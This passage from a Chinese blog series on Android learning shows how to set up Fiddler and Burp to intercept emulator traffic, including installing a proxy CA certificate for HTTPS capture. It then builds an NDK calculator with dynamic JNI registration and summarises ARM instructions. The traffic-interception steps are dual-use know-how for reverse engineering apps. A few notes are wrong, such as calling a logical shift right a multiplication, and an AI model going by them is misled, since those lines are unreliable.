src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113120.png" alt="image-20210709195214988"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113121.png" alt="image-20210709195303360"></p><p>几大功能 </p><p>清除目前所有的包</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113122.png" alt="image-20210709195618865"></p><p>抓包</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113123.png" alt="image-20210709195710733"></p><p>Capturing出现 是抓所有的包</p><p>点了之后 是只抓APP的包</p><p>再看另一个</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113124.png" alt="image-20210709195804464"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113125.png" alt="image-20210709195846415"></p><p>Decode是进行http字节压缩 防止乱码</p><p>HTTPS抓包设置</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113126.png" alt="image-20210709200024662"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113127.png" alt="image-20210709200111265"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113128.png" alt="image-20210709200123043"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113129.png" alt="image-20210709200140521"></p><p>这里的代理默认端口是：8888</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113130.png" alt="image-20210709200217994"></p><p>建议不要默认 这边我改成9977</p><p>这里是调节 字体大小</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113131.png" alt="image-20210709200301319"></p><p>然后关闭重新启动 就可以了</p><p>Fiddler抓websocks</p><pre class="line-numbers language-none"><code class="language-none">static function OnWebSocketMessage(oMsg: WebSocketMessage) { // Log Message to the LOG tab FiddlerApplication.Log.LogString(oMsg.ToString());}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进行添加</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113132.png" alt="image-20210709200530351"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113133.png" alt="image-20210709200656060"></p><p>然后抓到的websocks会在log中进行输出</p><h2 id="HTTP-Debugger-Pro"><a href="#HTTP-Debugger-Pro" class="headerlink" title="HTTP Debugger Pro"></a>HTTP Debugger Pro</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113134.png" alt="image-20210711111238113"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113135.png" alt="image-20210711111946079"></p><h2 id="burp"><a href="#burp" class="headerlink" title="burp"></a>burp</h2><p>打开之后</p><p>进行设置代理服务器</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113136.png" alt="image-20210711112505401"></p><p>这里是本机的IP</p><p>然后打开模拟器</p><p>进行设置</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113137.png" alt="image-20210711112732985"></p><p>进入WLAN 左键点住</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113138.png" alt="image-20210711112851951"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113139.png" alt="image-20210711112943405"></p><p>保存 </p><p>当我点击 逍遥向导</p><p>已经开始了抓包</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113140.png" alt="image-20210711113120606"></p><p>然后进行设置 抓HTTPS的包</p><p>进行下载证书</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113141.png" alt="image-20210711113242348"></p><p>证书导入</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113142.png" alt="image-20210711113349577"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113143.png" alt="image-20210711113437566"></p><p>弹出一个警告</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113144.png" alt="image-20210711113532752"></p><p>然后继续操作</p><p>进行导出</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113145.png" alt="image-20210711113615534"></p><p>是一个<code>crt</code>的文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113146.png" alt="image-20210711113642184"></p><p>直接拖进模拟器中来</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113147.png" alt="image-20210711113809456"></p><p>点击进行安装</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113148.png" alt="image-20210711113847955"></p><p>进行设置</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113149.png" alt="image-20210711113911147"></p><p>设置完成 之后 提示已经安装<code>a001</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113150.png" alt="image-20210711113948570"></p><p>然后 打开浏览器 随意输入一个<code>HTTPS</code>的网址 进行抓包</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113151.png" alt="image-20210711114315150"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210713113152.png" alt="image-20210711114332316"></p><p>可以看到是可以的</p>]]></content>
      
      
      <categories>
          
          <category> 安卓学习系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓学习(一) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓学习(七)</title>
      <link href="/2021/10/28/an-zhuo-xue-xi-qi/"/>
      <url>/2021/10/28/an-zhuo-xue-xi-qi/</url>
      
        <content type="html"><![CDATA[<h2 id="NDK动态"><a href="#NDK动态" class="headerlink" title="NDK动态"></a>NDK动态</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301738338.png" alt="image-20210825204958774"></p><p>Eclipse创建工程</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301738855.png" alt="image-20210825180830127"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301738773.png" alt="image-20210825205317633"></p><p>然后一路默认 Finish即可</p><p>这个 前面讲过</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301738530.png" alt="image-20210825205443962"></p><p>去掉Hello world</p><p>我们今天的目标是做一个计算机</p><h2 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h2><p>放入两个Plain Test</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301738353.png" alt="image-20210825205718536"></p><p>在放入两个TestView</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301738736.png" alt="image-20210825205838196"></p><p>选中之后 修改文本</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301739859.png" alt="image-20210825205950979"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301739542.png" alt="image-20210825210016724"></p><p>导入四个Button 做运算符</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301739110.png" alt="image-20210825210137726"></p><p>同样修改名字</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301739889.png" alt="image-20210825210318474"></p><p>进入xml底层   进行查看</p><p>双击即可</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301741270.png" alt="image-20210825210350292"></p><p>修改ID信息</p><pre class="line-numbers language-none"><code class="language-none">+:add-:sub*:mul/:div<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301741334.png" alt="image-20210825210722930"></p><p>进行保存</p><p>把位置重新规划好</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301741205.png" alt="image-20210825210927558"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301741400.png" alt="image-20210825210945400"></p><h2 id="Java代码编写"><a href="#Java代码编写" class="headerlink" title="Java代码编写"></a>Java代码编写</h2><p>创建一个方法进行初始化控件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301741625.png" alt="image-20210825211133103"></p><p><code>init()</code>初始化控件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301741607.png" alt="image-20210825211520439"></p><h3 id="绑定编辑框的变量"><a href="#绑定编辑框的变量" class="headerlink" title="绑定编辑框的变量"></a>绑定编辑框的变量</h3><p>定义first变量</p><p>绑定编辑框</p><p>定义好类型:EditText</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301741614.png" alt="image-20210825212217300"></p><p>对应xml文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301742067.png" alt="image-20210825212159046"></p><p>定义第二个编辑框</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301742889.png" alt="image-20210825212520802"></p><p>对应xml文档</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301742854.png" alt="image-20210825212543543"></p><p>然后绑定Button类型的运算符</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301742061.png" alt="image-20210825213053128"></p><p>对应xml文档</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301742352.png" alt="image-20210825213128145"></p><p>一样的方法 绑定其他三个运算符</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301743129.png" alt="image-20210825213814141"></p><p>对应xml文档</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301743198.png" alt="image-20210825213303479"></p><h3 id="定义两个全局变量"><a href="#定义两个全局变量" class="headerlink" title="定义两个全局变量"></a>定义两个全局变量</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301743499.png" alt="image-20210825213848855"></p><h3 id="定义native方法"><a href="#定义native方法" class="headerlink" title="定义native方法"></a>定义native方法</h3><p><code>native</code>方法的实现是在<code>so</code>层</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301743035.png" alt="image-20210825213954695"></p><h3 id="获取编辑框中的值"><a href="#获取编辑框中的值" class="headerlink" title="获取编辑框中的值"></a>获取编辑框中的值</h3><p>one</p><p>使用<code>getText</code>转到<code>toString</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301743364.png" alt="image-20210825214150172"></p><p>two也是一样的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301743812.png" alt="image-20210825214558480"></p><h3 id="定义运算方法"><a href="#定义运算方法" class="headerlink" title="定义运算方法"></a>定义运算方法</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301743424.png" alt="image-20210825214722217"></p><h3 id="监听绑定按钮"><a href="#监听绑定按钮" class="headerlink" title="监听绑定按钮"></a>监听绑定按钮</h3><p>new一个<code>OnClickListener</code></p><p>通过onClick进行监听</p><p>逻辑是通过ID来执行命令操作</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301744402.png" alt="image-20210825220650830"></p><h3 id="接收按钮Id"><a href="#接收按钮Id" class="headerlink" title="接收按钮Id"></a>接收按钮Id</h3><p>key-&gt;v中getId的按钮</p><p>value是add按钮的ID</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301744005.png" alt="image-20210825220737284"></p><p>继续添加其他三个运算符</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301744822.png" alt="image-20210825220943594"></p><h3 id="显示界面"><a href="#显示界面" class="headerlink" title="显示界面"></a>显示界面</h3><p>需要去调用方法Toast</p><p>需要三个参数 </p><p>之前讲述过 这里就不展开说了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301744457.png" alt="image-20210825221119018"></p><pre class="line-numbers language-none"><code class="language-none">context参数:上下文使用 MainActivity中的text参数:我们获取的add(one,tWo)duration参数:使用show()进行显示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注:add这个类型是<code>float</code>类型,需要转换为<code>string</code>类型</p><p>加个字符串即可</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301744503.png" alt="image-20210825221417471"></p><p>进行其他三个运算符的显示</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301744531.png" alt="image-20210826094931849"></p><h3 id="默认值的绑定"><a href="#默认值的绑定" class="headerlink" title="默认值的绑定"></a>默认值的绑定</h3><p>使用<code>OnClickListener</code>进行默认值的绑定</p><p>定义变量<code>cli</code></p><p>修饰符:<code>final</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301744065.png" alt="image-20210826095618006"></p><p>我们在加减乘除的时候 都要用到编辑框</p><p>最后把编辑框放入<code>case</code>中</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301744071.png" alt="image-20210826100028910"></p><p>保存 即可</p><h2 id="JNI层编写"><a href="#JNI层编写" class="headerlink" title="JNI层编写"></a>JNI层编写</h2><h3 id="创建JNI文件夹"><a href="#创建JNI文件夹" class="headerlink" title="创建JNI文件夹"></a>创建JNI文件夹</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301744405.png" alt="image-20210826100503029"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301745802.png" alt="image-20210826100535091"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301745654.png" alt="image-20210826100552766"></p><h3 id="创建-c文件"><a href="#创建-c文件" class="headerlink" title="创建.c文件"></a>创建<code>.c</code>文件</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301745919.png" alt="image-20210826100645799"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301745390.png" alt="image-20210826100707250"></p><h3 id="写入头文件"><a href="#写入头文件" class="headerlink" title="写入头文件"></a>写入头文件</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301745229.png" alt="image-20210826101131721"></p><h3 id="jfloat"><a href="#jfloat" class="headerlink" title="jfloat"></a>jfloat</h3><p>使用jfloat 前两个参数是固定的 查万能表即可</p><p>然后使用方法add 后面两个是传入的参数</p><pre class="line-numbers language-none"><code class="language-none">jfloat add(JNIEvn* env, jobject obj, jfloat a, jfloat b)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301745929.png" alt="image-20210826101351992"></p><p>方法体写入+</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301745875.png" alt="image-20210826101631094"></p><p>一样的方法写入其他三个 运算符</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301745431.png" alt="image-20210826101814174"></p><p>注:</p><p>方法名是不需要一样的</p><p>因为会使用JNI的接口进行两边函数的关联</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753233.png" alt="image-20210826101832635"></p><h3 id="C层和Java层的绑定"><a href="#C层和Java层的绑定" class="headerlink" title="C层和Java层的绑定"></a>C层和Java层的绑定</h3><p>使用结构体定义结构体数组:JNINativeMethod</p><pre class="line-numbers language-none"><code class="language-none">JNINativeMethod nativeMethod[]{};<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>写入结构体:struct</p><p>查万能表</p><pre class="line-numbers language-none"><code class="language-none">//定义一个动态注册JNINativeMethod结构体,这个与动态注册有关,里面有三个元素typedef struct {    const char* name; //第一个参数 name 是java 方法名;    const char* signature; //第二个参数 signature 用于描述方法的参数与返回值,也就是java方法签名信息,    void*       fnPtr; //第三个参数 fnPtr 是函数指针,指向 jni 函数;} JNINativeMethod;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到需要三个参数</p><pre class="line-numbers language-none"><code class="language-none">1、java方法名称2、参数、返回值、签名信息3、函数指针<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">{"add","(FF)F",(void*)add},{"sub","(FF)F",(void*)sub},{"mul","(FF)F",(void*)mul},{"div","(FF)F",(void*)div},<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753234.png" alt="image-20210826102910356"></p><h3 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h3><p>使用<code>RegisterNatives</code></p><p>查万能表</p><pre class="line-numbers language-none"><code class="language-none">jint        (*RegisterNatives)(JNIEnv*, jclass, const JNINativeMethod*,jint);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753236.png" alt="image-20210826103305811"></p><p>四个参数 进行指出</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753237.png" alt="image-20210826103421370"></p><p>第二个参数jclass 需要调用FindClass</p><p>重新定义一个方法aaa</p><p>继续指出,定义参数,被修饰的方法的类路径</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753238.png" alt="image-20210826103804176"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753239.png" alt="image-20210826103913168"></p><p>第三个参数 是定义的数组名称</p><p>第四个参数 是数组的数量</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753240.png" alt="image-20210826104059864"></p><h3 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h3><p>写入一个if条件判断 </p><p>和0比较</p><p>满足条件,返回-1</p><p>不满足条件,返回0</p><p>查万能表可知</p><pre class="line-numbers language-none"><code class="language-none">#define JNI_OK          (0)#define JNI_ERR         (-1) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753241.png" alt="image-20210826105409914"></p><p>注:这里的数组个数<code>jnit</code> 为4位</p><p>严谨的写法是:</p><pre class="line-numbers language-none"><code class="language-none">sizeof(nativeMethod)/sizeof(nativeMethod[0])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753242.png" alt="image-20210826105613836"></p><p>这个时候 注册函数 就写完了</p><p>写动态注册</p><h3 id="JNI-Onload"><a href="#JNI-Onload" class="headerlink" title="JNI_Onload"></a>JNI_Onload</h3><p>继续 开始</p><p>写动态注册</p><p>使用<code>JNI_Onload</code></p><p>查万能表可知</p><pre class="line-numbers language-none"><code class="language-none">JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753243.png" alt="image-20210826105853394"></p><p>给方法体定义一个jni</p><pre class="line-numbers language-none"><code class="language-none">jint        (*GetEnv)(JavaVM*, void**, jint);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>GetEnv</code>有三个参数</p><pre class="line-numbers language-none"><code class="language-none">第一个参数VM:补全第二个参数void**:二级指针,指向(&amp;)env的地址第三个参数jint:版本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后 还需要进行指出</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753244.png" alt="image-20210826110512020"></p><h3 id="条件判断-1"><a href="#条件判断-1" class="headerlink" title="条件判断"></a>条件判断</h3><p>判断env是否获取成功</p><p>不等于0就返回-1</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753245.png" alt="image-20210826110849838"></p><p>继续对注册函数 进行条件判断 </p><p>不等于0就返回-1</p><p>加上env参数</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753246.png" alt="image-20210826111215210"></p><p>最后添加一个返回版本</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753247.png" alt="image-20210826111338421"></p><h2 id="so库"><a href="#so库" class="headerlink" title="so库"></a>so库</h2><p>编写两个<code>.mk</code>文件即可</p><p>把之前的拿过来 就可以</p><p><code>Android.mk</code></p><pre class="line-numbers language-none"><code class="language-none">LOCAL_PATH := $(call my-dir)   include $(CLEAR_VARS)  LOCAL_MODULE    := jsq #模块名称  LOCAL_SRC_FILES := jsq.c #源文件  .c或者.cppLOCAL_ARM_MODE := arm #编译后的指令集 ARM指令LOCAL_LDLIBS += -llog #依赖库    include $(BUILD_SHARED_LIBRARY) #指定编译文件的类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753248.png" alt="image-20210826122517544"></p><p>注:so库要调用的编译文件类型是:<code>BUILD_SHARED_LIBRARY</code></p><p><code>Application.mk</code></p><pre class="line-numbers language-none"><code class="language-none">APP_ABI := x86 armeabi-v7aAPP_PLATFORM := android-8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753249.png" alt="image-20210826111944458"></p><h2 id="简单排错"><a href="#简单排错" class="headerlink" title="简单排错"></a>简单排错</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753250.png" alt="image-20210826123112338"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753251.png" alt="image-20210826122839886"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753252.png" alt="image-20210826124014949"></p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753253.png" alt="image-20210826124028143"></p><p>刷新</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753254.png" alt="image-20210826124044154"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753255.png" alt="image-20210826124106700"></p><h2 id="java层调用so库"><a href="#java层调用so库" class="headerlink" title="java层调用so库"></a>java层调用so库</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753256.png" alt="image-20210826124239000"></p><h2 id="ARM汇编"><a href="#ARM汇编" class="headerlink" title="ARM汇编"></a>ARM汇编</h2><p>要去熟悉so库了,冲冲冲</p><p>丢入一个so文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753257.png" alt="image-20210829230113402"></p><p><code>so</code>文件的位置:<code>一个项目的libs目录下</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753258.png" alt="image-20210829230302570"></p><h2 id="进制转换对应表"><a href="#进制转换对应表" class="headerlink" title="进制转换对应表"></a>进制转换对应表</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753259.png" alt="image-20210829232050612"></p><h3 id="一、跳转指令"><a href="#一、跳转指令" class="headerlink" title="一、跳转指令"></a>一、跳转指令</h3><p>B:表示程序跳转</p><pre class="line-numbers language-none"><code class="language-none">1.B:无条件跳转2.BL:带链接的无条件跳转3.BX:带状态切换的无条件跳转 根据目标地址最低位切换状态(arm/thumb)4.BLX:带链接和状态切换的无条件跳转5.B 1oc_:地址6.BEQ,BNE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二、存储器与寄存器交互数据指令核心"><a href="#二、存储器与寄存器交互数据指令核心" class="headerlink" title="二、存储器与寄存器交互数据指令核心"></a>二、存储器与寄存器交互数据指令核心</h3><p>存储器、寄存器:用来存储数据</p><pre class="line-numbers language-none"><code class="language-none">小数据:寄存器;大数据:栈<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">存储器(主存,内存)寄存器中放的数据:可以是字符串,可以是数,也可以是一个地址,它可以放各种类型的数据存储地址单元:地址与地址中存在的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1、LDR、STR"><a href="#1、LDR、STR" class="headerlink" title="1、LDR、STR"></a>1、LDR、STR</h4><p>LDR:从存储器中加载数据到寄存器 ⬅ Load(从右到左)</p><p>STR:将寄存器的数据存储到存储器 ➡ Store(从左往右)</p><p>LDR  <code>R8,[R9,#4]</code><br>R8为待加载数据的寄存器,加载值为<code>R9+0×4</code>所指向的存储单元</p><p>就是把右边放到左边</p><p>[]如果没括号就是直接把值直接放入R8</p><p>举个例子</p><pre class="line-numbers language-none"><code class="language-none">LDR PC, [SP+4+var_4]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析</p><pre class="line-numbers language-none"><code class="language-none">SP 栈指针寄存器,地址数据SP+4+var_4将被放进PCSTR R8,[R9,#4]:和LDR相反将R8寄存器的数据存储到R9+0x4指向的存储单元<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="2、LDM、STM"><a href="#2、LDM、STM" class="headerlink" title="2、LDM、STM"></a>2、LDM、STM</h4><pre class="line-numbers language-none"><code class="language-none">LDM:将存储器的数据加载到一个寄存器列表 ➡ (从左往右)LDM RO,{R1-R3}将R0指向的存储单元的数据`依次`加载到R1,R2,R3寄存器LDR:从存储器中加载数据到寄存器←Load LDR:用在函数快结尾的地方,添加对象的地方STM:将一个寄存器列表的数据存储到指定的存储器 ⬅(从右到左)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3、PUSH、POP"><a href="#3、PUSH、POP" class="headerlink" title="3、PUSH、POP"></a>3、PUSH、POP</h4><pre class="line-numbers language-none"><code class="language-none">PUSH:将寄存器值推入堆栈   压栈POP:将堆栈值推出到寄存器  岀栈<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="4、SWP-SWP"><a href="#4、SWP-SWP" class="headerlink" title="4、SWP SWP"></a>4、SWP SWP</h4><pre class="line-numbers language-none"><code class="language-none">SWP:将寄存器与存储器之间的数据进行交换SWP R1,R1 [RO]将R1寄存器与R0指向的存储单元的内容进行交换堆,队列:数据结构,栈是竖的,后进先岀,且只能从栈顶依次填入数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三、数据传送指令"><a href="#三、数据传送指令" class="headerlink" title="三、数据传送指令"></a>三、数据传送指令</h3><pre class="line-numbers language-none"><code class="language-none">MOV:move MOV:将立即数或寄存器的数据传送到目标寄存器MOV RO,#8  R0=8把后面的#8值给前面的RO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="四、数据算术运算指令"><a href="#四、数据算术运算指令" class="headerlink" title="四、数据算术运算指令"></a>四、数据算术运算指令</h3><pre class="line-numbers language-none"><code class="language-none">ADD(+),SUB(-),MUL(*),DIV(/)涉及到:有符号,无符号运算,带进位运算<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="五、数据逻辑运算指令"><a href="#五、数据逻辑运算指令" class="headerlink" title="五、数据逻辑运算指令"></a>五、数据逻辑运算指令</h3><pre class="line-numbers language-none"><code class="language-none">与:AND    全1出1两边为真,结果才为真或:ORR    有1出1有一个为真,结果就为真异或:EOR  相同为零,不同为1如果两个值相等就为零,不相等就为1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">移位:实质是乘,除,类似于小数点移位但与平常算数相反,小数点左移,数变小;小数点右移,数变大<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">逻辑移位小数点左移数变大,小数点右移数变小,且按2的倍数进行,因为是2进制LSL:逻辑左移LSR:逻辑右移LSL R0,R1҅#2 R0=R1*4 LSR R0,R1҅#2 R0=R1*2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="六、比较指令"><a href="#六、比较指令" class="headerlink" title="六、比较指令"></a>六、比较指令</h3><pre class="line-numbers language-none"><code class="language-none">CMP:比较CMP R0 #0 R0寄存器中的值与0比较标志位:如z位,这个都可以在动态调试时,寄存器窗口看到<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="七、其他指令"><a href="#七、其他指令" class="headerlink" title="七、其他指令"></a>七、其他指令</h3><pre class="line-numbers language-none"><code class="language-none">协处理器指令:SWT（切换用户模式、伪指令:DCB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="八、寄存器寻址方式"><a href="#八、寄存器寻址方式" class="headerlink" title="八、寄存器寻址方式"></a>八、寄存器寻址方式</h3><p>用到的是数据传送指令</p><pre class="line-numbers language-none"><code class="language-none">立即寻址:MOV RO,#1234R0=0×1234寄存器寻址:MOV R0,R1 R0=R1寄存器移位寻址:MOV RO,R1,LSL #2R0=R1*4寄存器间接寻址:LDR R0,[R1]将R1寄存器中的值作为地址,取出地址中的值赋R0寄存器间接基址偏移寻址:LDR R0,[R1,#-4]将R1寄存器的值(-0×4)的值作为地址,取出地址中的值给RO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="简单分析so库"><a href="#简单分析so库" class="headerlink" title="简单分析so库"></a>简单分析so库</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753260.png" alt="image-20210830010140978"></p><pre class="line-numbers language-none"><code 